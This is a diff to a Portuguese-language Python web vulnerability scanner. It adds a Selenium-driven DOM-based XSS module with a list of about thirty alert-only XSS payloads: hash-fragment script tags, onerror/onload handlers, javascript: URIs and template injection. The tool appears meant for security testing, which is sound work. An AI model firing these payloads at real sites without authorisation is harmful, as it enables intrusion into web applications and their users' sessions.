@@ -2458,7 +2458,7 @@ class XSSScanner:
             console.print("-" * 60)
             console.print(f"[*] Executando scanner de XSS em: [bold cyan]{self.base_url}[/bold cyan]")
             if self.scan_stored: console.print("[*] Modo XSS Armazenado: [bold green]Ativado[/bold green]")
-            if self.fuzz_dom: console.print("[*] Modo XSS DOM: [bold yellow]Ativado (Funcionalidade Futura)[/bold yellow]")
+            if self.fuzz_dom: console.print("[*] Modo XSS DOM: [bold green]Ativado[/bold green]")
             console.print("-" * 60)
 
         try:
@@ -2484,24 +2484,44 @@ class XSSScanner:
             data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea'], {'name': True})}
             for param in data: tasks.append((method, action, param, data))
         
-        if not tasks and not forms:
+        if not tasks and not forms and not self.fuzz_dom:
             if not return_findings: console.print("[yellow]Nenhum ponto de entrada (parâmetro ou formulário) encontrado para testar XSS.[/yellow]")
             return [] if return_findings else None
         
-        # Execução dos scans
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=return_findings) as progress:
-            # 1. Scan de XSS Refletido
-            self._scan_reflected(tasks, progress)
-
-            # 2. Scan de XSS Armazenado (se ativado)
-            if self.scan_stored:
-                post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
-                if post_forms:
-                    self._inject_into_forms(post_forms, progress)
-                    self._verify_storage(progress)
+        # Se não há pontos de entrada tradicionais mas DOM XSS está ativado, continua
+        if not tasks and not forms and self.fuzz_dom:
+            if not return_findings: console.print("[yellow]Nenhum ponto de entrada tradicional encontrado. Executando apenas DOM XSS.[/yellow]")
         
+        # Execução dos scans (apenas se houver pontos de entrada tradicionais)
+        if tasks or forms:
+            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=return_findings) as progress:
+                # 1. Scan de XSS Refletido
+                if tasks:
+                    self._scan_reflected(tasks, progress)
+
+                # 2. Scan de XSS Armazenado (se ativado)
+                if self.scan_stored and forms:
+                    post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
+                    if post_forms:
+                        self._inject_into_forms(post_forms, progress)
+                        self._verify_storage(progress)
+        
+        # DOM XSS scanning
         if self.fuzz_dom:
-            console.print("[yellow]Aviso: A análise de XSS baseado em DOM (`--fuzz-dom`) ainda não está implementada.[/yellow]")
+            try:
+                dom_scanner = DOMXSSScanner(self.base_url, verbose=self.verbose)
+                dom_vulnerabilities = dom_scanner.scan()
+                
+                # Adiciona vulnerabilidades DOM XSS aos resultados principais
+                self.vulnerable_points.extend(dom_vulnerabilities)
+                
+                if self.verbose:
+                    console.print(f"[+] DOM XSS scan concluído: {len(dom_vulnerabilities)} vulnerabilidades encontradas")
+                    
+            except Exception as e:
+                console.print(f"[red]Erro durante scan DOM XSS: {e}[/red]")
+                if self.verbose:
+                    console.print("[yellow]Dica: Certifique-se de que o Selenium e um WebDriver (Chrome/Firefox) estão instalados[/yellow]")
 
         if return_findings: return self.vulnerable_points
         self._present_findings()
@@ -2526,6 +2546,402 @@ class XSSScanner:
                 table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
             console.print(table)
         console.print("-" * 60)
+
+# --- CLASSE DOM XSS SCANNER ---
+
+class DOMXSSScanner:
+    def __init__(self, base_url, verbose=False):
+        self.base_url = base_url
+        self.verbose = verbose
+        self.driver = None
+        self.vulnerable_points = []
+        
+        # DOM XSS sources (fontes de dados)
+        self.dom_sources = [
+            'document.URL',
+            'document.documentURI', 
+            'document.baseURI',
+            'location.href',
+            'location.search',
+            'location.pathname',
+            'location.hash',
+            'document.referrer',
+            'window.name',
+            'history.pushState',
+            'history.replaceState',
+            'localStorage',
+            'sessionStorage',
+            'document.cookie',
+            'postMessage'
+        ]
+        
+        # DOM XSS sinks (pontos de execução)
+        self.dom_sinks = [
+            'eval()',
+            'Function()',
+            'setTimeout()',
+            'setInterval()',
+            'document.write()',
+            'document.writeln()',
+            'innerHTML',
+            'outerHTML',
+            'document.createElement',
+            'insertAdjacentHTML',
+            'location.href',
+            'location.replace()',
+            'location.assign()',
+            'open()',
+            'showModalDialog()',
+            'execScript()',
+            'crypto.generateCRMFRequest()',
+            'ScriptElement.src',
+            'ScriptElement.text',
+            'ScriptElement.textContent',
+            'ScriptElement.innerText'
+        ]
+        
+        # Payloads específicos para DOM XSS
+        self.dom_payloads = self._get_dom_payloads()
+    
+    def _get_dom_payloads(self):
+        """Retorna payloads específicos para DOM-based XSS."""
+        return [
+            # Hash-based XSS (Google XSS Game Level 3 specific)
+            "#1<script>alert('dom-xss-level3')</script>",
+            "#2<img src=x onerror=alert('dom-xss-level3')>",
+            "#3<svg onload=alert('dom-xss-level3')>",
+            "#1'<script>alert('dom-xss-level3')</script>",
+            "#1\"<script>alert('dom-xss-level3')</script>",
+            "#1 onerror=alert('dom-xss-level3') src=x",
+            "#1'><img src=x onerror=alert('dom-xss-level3')>",
+            "#1\"><img src=x onerror=alert('dom-xss-level3')>",
+            
+            # Generic Hash-based XSS
+            "#<script>alert('dom-xss-hash')</script>",
+            "#<img src=x onerror=alert('dom-xss-hash')>",
+            "#javascript:alert('dom-xss-hash')",
+            
+            # URL fragment XSS  
+            "#<svg onload=alert('dom-xss-fragment')>",
+            "#<iframe src=javascript:alert('dom-xss-fragment')>",
+            
+            # PostMessage XSS
+            "<script>window.postMessage('<img src=x onerror=alert(\"dom-xss-postmessage\")>','*')</script>",
+            
+            # Location-based XSS
+            "javascript:alert('dom-xss-location')",
+            "data:text/html,<script>alert('dom-xss-data')</script>",
+            
+            # DOM manipulation XSS
+            "<script>document.body.innerHTML='<img src=x onerror=alert(\"dom-xss-inner\")'</script>",
+            "<script>document.write('<img src=x onerror=alert(\"dom-xss-write\")')</script>",
+            
+            # Event-based DOM XSS
+            "#<body onload=alert('dom-xss-event')>",
+            "#<div onclick=alert('dom-xss-click')>Click</div>",
+            
+            # Angular/React specific
+            "{{constructor.constructor('alert(\"dom-xss-angular\")')()}}",
+            "${alert('dom-xss-template')}",
+            
+            # Advanced DOM XSS
+            "#<script>eval('ale'+'rt(\"dom-xss-eval\")')</script>",
+            "#<script>Function('ale'+'rt(\"dom-xss-function\")')();</script>",
+            "#<script>setTimeout('alert(\"dom-xss-timeout\")',0)</script>",
+            
+            # JSON-based DOM XSS  
+            '{"xss":"<img src=x onerror=alert(\'dom-xss-json\')>"}',
+            
+            # URL parameter manipulation
+            "?xss=<script>alert('dom-xss-param')</script>",
+            "&payload=<img src=x onerror=alert('dom-xss-param2')>",
+            
+            # Document.cookie XSS
+            "<script>document.cookie='xss=<img src=x onerror=alert(\"dom-xss-cookie\")>'</script>",
+            
+            # LocalStorage XSS  
+            "<script>localStorage.setItem('xss','<img src=x onerror=alert(\"dom-xss-storage\")')</script>",
+            
+            # History API XSS
+            "<script>history.pushState(null,null,'#<img src=x onerror=alert(\"dom-xss-history\")')</script>"
+        ]
+    
+    def _setup_driver(self):
+        """Configura o WebDriver (Chrome/Firefox headless)."""
+        if not SELENIUM_AVAILABLE:
+            raise Exception("Selenium não está instalado. Execute: pip install selenium")
+        
+        try:
+            # Tenta Chrome primeiro
+            chrome_options = ChromeOptions()
+            chrome_options.add_argument('--headless')
+            chrome_options.add_argument('--no-sandbox')
+            chrome_options.add_argument('--disable-dev-shm-usage')
+            chrome_options.add_argument('--disable-gpu')
+            chrome_options.add_argument('--window-size=1920,1080')
+            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
+            chrome_options.add_experimental_option('useAutomationExtension', False)
+            
+            self.driver = webdriver.Chrome(options=chrome_options)
+            if self.verbose:
+                console.print("[+] WebDriver Chrome configurado com sucesso")
+            return True
+            
+        except WebDriverException:
+            try:
+                # Fallback para Firefox
+                firefox_options = FirefoxOptions()
+                firefox_options.add_argument('--headless')
+                firefox_options.add_argument('--width=1920')
+                firefox_options.add_argument('--height=1080')
+                
+                self.driver = webdriver.Firefox(options=firefox_options)
+                if self.verbose:
+                    console.print("[+] WebDriver Firefox configurado com sucesso")
+                return True
+                
+            except WebDriverException as e:
+                if self.verbose:
+                    console.print(f"[red]Erro ao configurar WebDriver: {e}[/red]")
+                return False
+    
+    def _inject_dom_payload(self, url, payload):
+        """Injeta payload DOM XSS na URL."""
+        try:
+            # Para payloads que começam com #, adiciona ao final da URL
+            if payload.startswith('#'):
+                test_url = url + payload
+            # Para payloads de parâmetro, adiciona como query string
+            elif payload.startswith('?') or payload.startswith('&'):
+                separator = '&' if '?' in url else '?'
+                test_url = url + separator + payload.lstrip('?&')
+            # Para outros payloads, tenta diferentes abordagens
+            else:
+                test_url = url + '#' + payload
+            
+            self.driver.get(test_url)
+            WebDriverWait(self.driver, 3).until(lambda d: d.execute_script("return document.readyState") == "complete")
+            
+            return test_url
+            
+        except TimeoutException:
+            return url
+        except Exception:
+            return None
+    
+    def _detect_dom_xss_execution(self, payload):
+        """Detecta se o DOM XSS foi executado."""
+        try:
+            # Reset do estado de alert antes de cada teste
+            self.driver.execute_script("window.alertTriggered = false; window.lastAlertMessage = '';")
+            
+            # Pequena pausa para permitir execução
+            import time
+            time.sleep(2)
+            
+            # Verifica se alert foi chamado
+            alert_triggered = self.driver.execute_script("return window.alertTriggered === true;")
+            last_alert = self.driver.execute_script("return window.lastAlertMessage || '';")
+            
+            # Verifica mudanças no DOM relacionadas ao payload
+            payload_indicators = ['dom-xss', 'level3', 'xss-test']
+            dom_contains_indicators = self.driver.execute_script(f"""
+                var content = document.documentElement.innerHTML.toLowerCase();
+                var indicators = {payload_indicators};
+                return indicators.some(function(indicator) {{
+                    return content.includes(indicator);
+                }});
+            """)
+            
+            # Verifica console errors que indicam execução
+            try:
+                console_errors = self.driver.get_log('browser')
+                script_errors = [log for log in console_errors if any(indicator in log.get('message', '').lower() for indicator in payload_indicators)]
+            except:
+                console_errors = []
+                script_errors = []
+            
+            # Verifica se o payload está presente no DOM
+            payload_in_dom = False
+            try:
+                clean_payload = payload.replace("'", "\\'").replace('"', '\\"')
+                payload_in_dom = self.driver.execute_script(f"""
+                    return document.documentElement.innerHTML.includes('{clean_payload}');
+                """)
+            except:
+                pass
+            
+            # Execução detectada se:
+            # 1. Alert foi chamado
+            # 2. DOM contém indicadores dos nossos payloads
+            # 3. Há erros de script relacionados
+            executed = alert_triggered or dom_contains_indicators or len(script_errors) > 0
+            
+            return {
+                'executed': executed,
+                'alert_triggered': alert_triggered,
+                'last_alert_message': last_alert,
+                'dom_contains_indicators': dom_contains_indicators,
+                'console_errors': script_errors,
+                'payload_in_dom': payload_in_dom,
+                'current_url': self.driver.current_url,
+                'page_title': self.driver.title
+            }
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Erro na detecção DOM XSS: {e}[/yellow]")
+            return {'executed': False, 'error': str(e)}
+    
+    def _analyze_javascript_sources_sinks(self):
+        """Analisa sources e sinks de JavaScript na página."""
+        try:
+            # Analisa scripts inline
+            scripts = self.driver.find_elements(By.TAG_NAME, "script")
+            sources_found = []
+            sinks_found = []
+            
+            for script in scripts:
+                script_content = script.get_attribute('innerHTML')
+                if script_content:
+                    # Verifica sources
+                    for source in self.dom_sources:
+                        if source in script_content:
+                            sources_found.append(source)
+                    
+                    # Verifica sinks  
+                    for sink in self.dom_sinks:
+                        if sink in script_content:
+                            sinks_found.append(sink)
+            
+            # Analisa event handlers
+            event_handlers = self.driver.execute_script("""
+                var handlers = [];
+                var elements = document.querySelectorAll('*');
+                for (var i = 0; i < elements.length; i++) {
+                    var attrs = elements[i].attributes;
+                    for (var j = 0; j < attrs.length; j++) {
+                        if (attrs[j].name.startsWith('on')) {
+                            handlers.push({
+                                element: elements[i].tagName,
+                                event: attrs[j].name,
+                                code: attrs[j].value
+                            });
+                        }
+                    }
+                }
+                return handlers;
+            """)
+            
+            return {
+                'sources': list(set(sources_found)),
+                'sinks': list(set(sinks_found)),
+                'event_handlers': event_handlers
+            }
+            
+        except Exception as e:
+            if self.verbose:
+                console.print(f"[yellow]Erro na análise de sources/sinks: {e}[/yellow]")
+            return {'sources': [], 'sinks': [], 'event_handlers': []}
+    
+    def scan(self):
+        """Executa o scan de DOM XSS."""
+        if not SELENIUM_AVAILABLE:
+            console.print("[red]Selenium não está disponível. Execute: pip install selenium[/red]")
+            return []
+        
+        if not self._setup_driver():
+            console.print("[red]Não foi possível configurar o WebDriver[/red]")
+            return []
+        
+        console.print(f"[*] Iniciando scan DOM XSS em: [cyan]{self.base_url}[/cyan]")
+        
+        try:
+            # Carrega a página inicial
+            self.driver.get(self.base_url)
+            WebDriverWait(self.driver, 10).until(lambda d: d.execute_script("return document.readyState") == "complete")
+            
+            # Configura override do alert globalmente
+            self.driver.execute_script("""
+                window.originalAlert = window.alert;
+                window.alertTriggered = false;
+                window.lastAlertMessage = '';
+                window.alert = function(msg) {
+                    window.alertTriggered = true;
+                    window.lastAlertMessage = msg;
+                    console.log('SPECTRA-ALERT-DETECTED:', msg);
+                    return true;
+                };
+            """)
+            
+            # Analisa sources e sinks
+            js_analysis = self._analyze_javascript_sources_sinks()
+            
+            if self.verbose and (js_analysis['sources'] or js_analysis['sinks']):
+                console.print(f"[+] Sources encontrados: {', '.join(js_analysis['sources'])}")
+                console.print(f"[+] Sinks encontrados: {', '.join(js_analysis['sinks'])}")
+            
+            # Testa payloads DOM XSS
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[progress.description]{task.description}"),
+                BarColumn(),
+                TimeRemainingColumn(),
+                console=console
+            ) as progress:
+                task = progress.add_task("[green]Testando DOM XSS...", total=len(self.dom_payloads))
+                
+                for payload in self.dom_payloads:
+                    progress.update(task, advance=1, description=f"[green]Testando: [cyan]{payload[:50]}...[/cyan]")
+                    
+                    # Injeta payload
+                    test_url = self._inject_dom_payload(self.base_url, payload)
+                    if not test_url:
+                        continue
+                    
+                    # Detecta execução
+                    result = self._detect_dom_xss_execution(payload)
+                    
+                    if result.get('executed'):
+                        # Detalhes da execução
+                        execution_details = []
+                        if result.get('alert_triggered'):
+                            execution_details.append(f"Alert chamado: '{result.get('last_alert_message', '')}'")
+                        if result.get('dom_contains_indicators'):
+                            execution_details.append("Indicadores encontrados no DOM")
+                        if result.get('console_errors'):
+                            execution_details.append(f"{len(result.get('console_errors', []))} erros de script")
+                        
+                        detail_text = f"Payload: {payload}"
+                        if execution_details:
+                            detail_text += f" | Execução: {' + '.join(execution_details)}"
+                        
+                        vulnerability = {
+                            'Risco': 'Alto',
+                            'Tipo': 'DOM-based XSS',
+                            'Detalhe': detail_text,
+                            'URL': test_url,
+                            'Recomendação': f"Sanitizar fontes DOM (location.hash, etc.) e validar sinks. Sources: {', '.join(js_analysis.get('sources', []))}. Sinks: {', '.join(js_analysis.get('sinks', []))}"
+                        }
+                        self.vulnerable_points.append(vulnerability)
+                        
+                        if self.verbose:
+                            console.print(f"[red]✗ DOM XSS encontrado: {payload}[/red]")
+                            console.print(f"    [yellow]URL: {test_url}[/yellow]")
+                            if result.get('alert_triggered'):
+                                console.print(f"    [green]✓ Alert executado: '{result.get('last_alert_message', '')}'[/green]")
+                            if result.get('dom_contains_indicators'):
+                                console.print(f"    [green]✓ Payload detectado no DOM[/green]")
+                            
+        except Exception as e:
+            console.print(f"[red]Erro durante scan DOM XSS: {e}[/red]")
+            
+        finally:
+            if self.driver:
+                self.driver.quit()
+        
+        return self.vulnerable_points
 
 def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, enable_bypasses=True, context_analysis=True, validate_execution=True, analyze_csp=True, verbose=False):
     scanner = XSSScanner(url, custom_payloads_file=custom_payloads_file, scan_stored=scan_stored, fuzz_dom=fuzz_dom)
@@ -4165,7 +4581,7 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_xss.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
     parser_xss.add_argument('--custom-payloads', help='Caminho para ficheiro com payloads XSS personalizados (um por linha). Se não especificado, usa base de 150+ payloads categorizados.')
     parser_xss.add_argument('--scan-stored', action='store_true', help='Ativa verificação de XSS Armazenado (Stored) com análise aprimorada de formulários e CSRF.')
-    parser_xss.add_argument('--fuzz-dom', action='store_true', help='[FUTURO] Ativa análise de XSS baseado em DOM usando headless browser.')
+    parser_xss.add_argument('--fuzz-dom', action='store_true', help='Ativa análise de XSS baseado em DOM usando headless browser (requer Selenium).')
     parser_xss.add_argument('--enable-bypasses', action='store_true', default=True, help='Ativa técnicas de bypass automáticas (encoding, WAF evasion). Padrão: ativado.')
     parser_xss.add_argument('--context-analysis', action='store_true', default=True, help='Ativa detecção context-aware (HTML, atributos, JavaScript, CSS). Padrão: ativado.')
     parser_xss.add_argument('--validate-execution', action='store_true', default=True, help='Ativa validação de execução JavaScript através de análise de resposta. Padrão: ativado.')
